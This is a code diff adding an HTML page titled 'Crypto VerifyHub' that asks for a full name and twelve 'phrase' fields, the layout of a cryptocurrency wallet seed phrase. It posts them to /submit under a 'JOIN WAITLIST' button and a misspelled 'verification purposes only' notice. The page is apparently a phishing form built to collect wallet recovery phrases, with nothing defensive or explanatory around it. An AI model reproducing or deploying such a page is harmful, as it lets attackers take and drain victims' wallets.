@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Crypto VerifyHub</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(to right, #0f0f0f, #1c1c1c);
+    color: white;
+}
+
+.container {
+    width: 95%;
+    max-width: 900px;
+    margin: 30px auto;
+    background: #1e1e1e;
+    padding: 20px;
+    border-radius: 12px;
+    box-shadow: 0 0 20px rgba(255,215,0,0.2);
+}
+
+h2 {
+    text-align: center;
+    color: gold;
+}
+
+.note {
+    text-align: center;
+    color: orange;
+    font-size: 14px;
+    margin-bottom: 20px;
+}
+
+.name-field input {
+    width: 100%;
+    padding: 12px;
+    border-radius: 8px;
+    border: none;
+    margin-bottom: 20px;
+}
+
+.phrase-container {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+}
+
+.phrase-container input {
+    flex: 1 1 48%;
+    padding: 10px;
+    border-radius: 8px;
+    border: none;
+}
+
+/* When screen is small (like small phones) */
+@media (max-width: 600px) {
+    .phrase-container input {
+        flex: 1 1 100%;
+    }
+}
+
+button {
+    width: 100%;
+    margin-top: 25px;
+    padding: 14px;
+    border: none;
+    border-radius: 8px;
+    background: gold;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+button:hover {
+    background: orange;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<h2>Crpto VerifyHub</h2>
+<p class="note">⚠ Note that this is for verification puposes only .</p>
+
+<form method="POST" action="/submit">
+
+<div class="name-field">
+<input type="text" name="name" placeholder="Enter Your Full Name" required>
+</div>
+
+<div class="phrase-container">
+<input type="text" name="phrase1" placeholder="Phrase 1" required>
+<input type="text" name="phrase2" placeholder="Phrase 2" required>
+<input type="text" name="phrase3" placeholder="Phrase 3" required>
+<input type="text" name="phrase4" placeholder="Phrase 4" required>
+<input type="text" name="phrase5" placeholder="Phrase 5" required>
+<input type="text" name="phrase6" placeholder="Phrase 6" required>
+<input type="text" name="phrase7" placeholder="Phrase 7" required>
+<input type="text" name="phrase8" placeholder="Phrase 8" required>
+<input type="text" name="phrase9" placeholder="Phrase 9" required>
+<input type="text" name="phrase10" placeholder="Phrase 10" required>
+<input type="text" name="phrase11" placeholder="Phrase 11" required>
+<input type="text" name="phrase12" placeholder="Phrase 12" required>
+</div>
+
+<button type="submit">JOIN WAITLIST</button>
+
+</form>
+
+</div>
+
+</body>
+  </html>
